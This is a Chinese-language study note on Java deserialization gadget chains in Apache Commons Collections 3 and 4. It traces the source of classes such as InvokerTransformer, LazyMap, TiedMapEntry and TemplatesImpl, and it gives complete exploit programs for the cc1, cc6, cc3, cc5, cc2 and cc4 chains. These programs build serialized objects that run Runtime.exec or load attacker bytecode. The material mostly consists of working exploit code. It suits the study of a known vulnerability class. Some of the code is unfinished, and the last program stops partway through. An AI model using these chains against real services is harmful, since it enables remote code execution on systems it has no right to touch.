## CommonCollections-3

### cc1

#### Transformer类

##### ConstantTransformer

```java
public class ConstantTransformer implements Transformer, Serializable {
	private final Object iConstant;
	public ConstantTransformer(Object constantToReturn) {
	    super();
	    iConstant = constantToReturn;
    	}
    	public Object transform(Object input) {
        	return iConstant;
    	}
}
```

ConstantTransformer的transform方法无论传入什么都返回常量iConstant，iConstant是构造函数中传入的参数

##### ChainedTransformer

```java
public class ChainedTransformer implements Transformer, Serializable {
	private final Transformer[] iTransformers;
	public ChainedTransformer(Transformer[] transformers) {
		super();
		iTransformers = transformers;
     	}
    	public Object transform(Object object) {
		for (int i = 0; i < iTransformers.length; i++) {
  			object = iTransformers[i].transform(object);
		}
		return object;
    	}
```

默认构造函数中传入一个Transformer数组。Transform方法链式调用其transform方法，将前一个Transformer的输出作为下一个调用的参数

##### InvokerTransformer

```java
public class InvokerTransformer implements Transformer, Serializable {
    	private final String iMethodName;
    	private final Class[] iParamTypes;
    	private final Object[] iArgs;
    	public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        	super();
        	iMethodName = methodName;
        	iParamTypes = paramTypes;
        	iArgs = args;
    	}
	public Object transform(Object input) {
		if (input == null) {
            		return null;
        	}
        	try {
            		Class cls = input.getClass();
            		Method method = cls.getMethod(iMethodName, iParamTypes);
            		return method.invoke(input, iArgs);
        	} catch (){
			......
		}
    	}
}
```

默认构造函数中传入的三个参数分别为，方法名，参数类型，参数值。其transformke对传入的参数调用InvokerTransformer构造函数时传入的方法。

#### 通过Transformer执行命令

由于Runtime类无法使用newInstance实例化，所以需要用getRuntime()实例化

1. 通过ConstantTransformer传入Runtime.class
2. 对Runtime.class调用getMethod获取getRuntime Method
3. 对getRuntime Method调用invoke获取Runtime实例
4. 对Runtime实例调用exec执行命令

* 直接调用

  ```
  Class c = Runtime.class;
  Method gtr = c.getMethod("getRuntime",null);

  // 返回的是object对象，无法用runtime接受，但是由于在ChinedTransformer中使用反射调用函数，即使不强制转换也可以调用其exec方法
  Runtime r = (Runtime)gtr.invoke(null,null);
  r.exec("calc");
  ```
* 通过ChainedTransformer

  ```
  ChainedTransformer ch = new ChainedTransformer(new Transformer[]{
          new ConstantTransformer(Runtime.class),
          new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new String[]{"getRuntime",null}),
          new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
          new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
  });
  ch.transform(null);	//由于ConstantTransformer返回自身，所以传什么参数的可以
  ```

#### chain

在TransformedMap中的checkSetValue调用了transform

```java
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

在MapEntry中的setValue调用了checkSetValue

```java
        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
```

在AnnotationInvocationHandler的readobject调用了setValue

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

#### exp

构造一个序列化的AnnotationInvocationHandler类，反序列化时触发

`readobject->setValue->checkSetValue->transform`

完整构造：

```java
package org.example;

import javax.xml.transform.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.*;


public class Main {
    public static void main(String[] args) throws Exception{

        // 通过调用ChainedTransformer的transform方法调用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new String[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        });
//        chainedTransformer.transform(null);
  
        //构造map
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","value");

        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
//        for (Map.Entry entry:transformedMap.entrySet()) {
//            entry.setValue(runtime);
//        }

        // 构造AnnotationInvocationHandler
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //创建构造器
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        //保证可以访问到
        annotationInvocationHandlerConstructor.setAccessible(true);
        //实例化传参，注解和构造好的Map
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

### cc6

#### chain

LazyMap的get方法也调用了transform方法

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

而TiedMapEntry的getValue调用了get方法

```java
public Object getValue() {
    return map.get(key);
}
```

TiedMapEntry的hashCode调用了getValue方法

```java
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
           (value == null ? 0 : value.hashCode()); 
}
```

HashMap的hash调用了hashCode方法

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

HashMap的readObject调用了hash方法

```java
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);
            @SuppressWarnings({"rawtypes","unchecked"})
                Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

#### exp

```java
package org.example;

import javax.xml.transform.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;


public class Main {
    public static void main(String[] args) throws Exception{
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new String[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        });

        Map<Object,Object> innerMap = new HashMap<Object,Object>();

        Map<Object,Object> lazymap = LazyMap.decorate(innerMap, new ConstantTransformer(1));
//        Map<Object,Object> lazymap = LazyMap.decorate(innerMap, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        HashMap<Object,Object> hashmap = new HashMap<>();
        hashmap.put(tiedMapEntry,"bbb");
        lazymap.remove("aaa");

        Class c = LazyMap.class;
        Field factoryFiled = c.getDeclaredField("factory");
        factoryFiled.setAccessible(true);
        factoryFiled.set(lazymap,chainedTransformer);

        serialize(hashmap);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

1. 在执行 `hashmap.put(tiedMapEntry,"bbb");`时，会直接调用hash从而导致命令执行，也可以通过反射在put时添加无用的tiedmapentry，然后再通过反射调用将tiedmapentry改为可以命令执行的tiedmapentry
2. 由于在反序列化的过程中会调用到

   ```
       public Object get(Object key) {
           // create value for key if key is not currently in the map
           if (map.containsKey(key) == false) {
               Object value = factory.transform(key);
               map.put(key, value);
               return value;
           }
           return map.get(key);
       }
   ```

   传入一个key作为参数，如果map中不包含key才会调用transform方法，但是初始化时 `TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");`传入了key，所以需要 `lazymap.remove("aaa");`，将key删除才会进入if分支

### cc3

cc3利用了动态类加载来执行命令

#### 动态类加载命令执行

TemplatesImpl类中的getTransletInstance方法对其_class属性实例化，实例化时执行静态代码

```java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them


	AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();


        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        translet.setAllowedProtocols(_accessExternalStylesheet);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }

        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

而实例化的内容_class[_transletIndex]在defineTransletClasses方法中决定，defineTransletClasses

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

`_class[i] = loader.defineClass(_bytecodes[i]);`，决定class的是_bytecodes

将恶意的字节码传入时，就会经过一系列调用实例化这个对象，执行其中的静态代码

newTransformer方法调用了getTransletInstance

```
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

所以对一个templates方法调用：getTransletInstance->getTransletInstance，实现利用

#### InvokerTransformer替换

InvokerTransfromer可能会被过滤，可以使用InstantiateTransformer绕过

TrAXFilter的构造函数中对传入的templates对象调用了newTransformer方法

```
public TrAXFilter(Templates templates)  throws
TransformerConfigurationException
{
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _useServicesMechanism = _transformer.useServicesMechnism();
}
```

InstantiateTransformer的transform方法

```
public Object transform(Object input) {
        try {
            if (input instanceof Class == false) {
                throw new FunctorException(
                    "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                        + (input == null ? "null object" : input.getClass().getName()));
            }
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            return con.newInstance(iArgs);

        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
        } catch (InstantiationException ex) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
        }
    }
```

获取对应参数的构造方法，然后实例化这个参数

在transform中，input是要实例化的类（TrAXFilter），iParamTypes是要调用的参数类型（Class[] {templates.class）,iArgs是构造好的Templates

#### exp

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerFactory;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class cc3 {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("E:\\java_vuln\\cc\\target\\classes\\org\\example\\exp.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                (new ConstantTransformer(TrAXFilter.class)),
                (new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}))
        });

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","value");

        // 构造AnnotationInvocationHandler
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //创建构造器
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        //保证可以访问到
        annotationInvocationHandlerConstructor.setAccessible(true);
        //实例化传参，注解和构造好的Map
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);

//        serialize(o);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

### cc5

#### chain

BadAttributeValueExpException的readObject方法

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
|| valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

对valObj调用了toString，而TiedMapEntry的toString方法

```java
public String toString() {
    return getKey() + "=" + getValue();
}
```

toString调用了getValue方法

```
    public Object getValue() {
        return map.get(key);
    }
```

而LazyMap的get方法调用了transform方法

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

#### exp

利用同cc6，命令执行方式相同，只是将上层的利用链改变

```java
package org.example;

import javax.xml.transform.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import javax.management.BadAttributeValueExpException;


public class cc5 {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new String[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        });

        HashMap<Object,Object> map = new HashMap<Object,Object>(1,1);
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException,tiedMapEntry);

        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

### cc7

#### chain

AbstractMap的equals调用了LazyMap的get方法

```
    public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```

AbstractMapDecoratord的equals调用了map.equals（若map为AbstractMap）

```
public boolean equals(Object object) {
    if (object == this) {
        return true;
    }
    return map.equals(object);
}
```

Hashtable的reconstitutionPut调用了equals

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
int hash = key.hashCode();
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
```

Hashtable的readObject调用了reconstitutionPut

```java
private void readObject(java.io.ObjectInputStream s)
     throws IOException, ClassNotFoundException
{
    // Read in the length, threshold, and loadfactor
s.defaultReadObject();

    // Read the original length of the array and number of elements
int origlength = s.readInt();
    int elements = s.readInt();

    // Compute new size with a bit of room 5% to grow but
    // no larger than the original size.  Make the length
    // odd if it's large enough, this helps distribute the entries.
    // Guard against the length ending up zero, that's not valid.
int length = (int)(elements * loadFactor) + (elements / 20) + 3;
    if (length > elements && (length & 1) == 0)
        length--;
    if (origlength > 0 && length > origlength)
        length = origlength;
    table = new Entry<?,?>[length];
    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
    count = 0;

    // Read the number of elements and then all the key/value objects
for (; elements > 0; elements--) {
        @SuppressWarnings("unchecked")
            K key = (K)s.readObject();
        @SuppressWarnings("unchecked")
            V value = (V)s.readObject();
        // synch could be eliminated for performance
reconstitutionPut(table, key, value);
    }
}
```

## Common-Collections-4

### cc2

在common-collections4中，TransformingComparator实现了反序列化接口

#### chain

PriorityQueue的readObject调用了heapify

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
s.defaultReadObject();

    // Read in (and discard) array length
s.readInt();

    queue = new Object[size];

    // Read in all elements.
for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
heapify();
}
```

heapify调用了siftDown

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

siftDown调用了siftDownUsingComparator

```java
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
	siftDownComparable(k, x);
}
```

siftDownUsingComparator调用了compare

```
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

TransformingComparator调用了transform

```java
public int compare(Object obj1, Object obj2) {
    Object value1 = this.transformer.transform(obj1);
    Object value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

#### exp

使用InvokerTransformer调用Templates的newTransformer方法来执行命令

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import javax.xml.ws.spi.Invoker;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class cc2 {
    public static void main(String[] args)throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("E:\\java_vuln\\common-collections-4\\target\\classes\\org\\example\\exp.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null, null)
        });

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));

//        transformingComparator.compare(1,2);

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field transformerField = transformingComparator.getClass().getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);

//        serialize(priorityQueue);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

### cc4

#### exp

使用InstantiateTransformer替换InvokerTransformer来实行命令

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import javax.xml.transform.Templates;
import javax.xml.ws.spi.Invoker;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class cc4 {
    public static void main(String[] args)throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("E:\\java_vuln\\common-collections-4\\target\\classes\\org\\example\\exp.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));

//        transformingComparator.compare(1,2);

PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field transformerField = transformingComparator.getClass().getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);

//        serialize(priorityQueue);
unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
